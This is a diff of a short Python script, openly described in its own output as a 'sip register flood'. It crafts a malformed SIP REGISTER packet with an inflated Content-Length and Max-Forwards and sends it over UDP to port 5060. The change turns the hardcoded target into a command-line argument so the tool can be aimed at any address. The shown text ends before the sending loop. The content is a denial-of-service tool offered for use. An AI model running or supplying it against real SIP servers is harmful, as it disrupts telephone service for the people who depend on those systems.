@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
 import socket
-import time
+import sys
 
 # register_string = """REGISTER sip:192.168.1.120 SIP/2.0
 # CSeq: 5 REGISTER
@@ -16,23 +16,27 @@ import time
 # Content-Length: 0
 # Max-Forwards: 70\n\r\n"""
 
-register_string = """REGISTER sip:192.168.1.120 SIP/2.0
+if len(sys.argv) != 2:
+    print("Syntax: {} [DST_IP]".format(sys.argv[0]))
+    exit(1)
+
+dst_hostname = sys.argv[1]
+dst_port = 5060
+
+register_string = """REGISTER sip:{0} SIP/2.0
 CSeq: 5 REGISTER
-Via: SIP/2.0/UDP 000.000.000.000:5060;branch=dfhfghthdfhf-dfgfh-sdfds-hfhfhgf-rgawsfdfewfdd;rport
+Via: SIP/2.0/UDP 000.000.000.000:{1};branch=dfhfghthdfhf-dfgfh-sdfds-hfhfhgf-rgawsfdfewfdd;rport
 User-Agent: Ekiga/4.0.1
 From: <sip:000@000.000.000.000>;tag=dfhfghthdfhf-dfgfh-sdfds-hfhfhgf-rgawsfdfewfdd
 Call-ID: dfhfghthdfhf-dfgfh-sdfds-hfhfhgf-rgawsfdfewfdd
 To: <sip:000@000.000.000.000>
-Contact: <sip:000@000.000.000.000:5060>
+Contact: <sip:000@000.000.000.000:{1}>
 Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,SUBSCRIBE,NOTIFY,REFER,MESSAGE,INFO,PING,PRACK
 Expires: 3600
 Content-Length: 1450
-Max-Forwards: 250\n\r\n"""
+Max-Forwards: 250\n\r\n""".format(dst_hostname, dst_port)
 
-dst_hostname = "192.168.1.120"
-dst_port = 5060
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 print("Starting sip register flood with a package size of {}".format(len(register_string)))
 
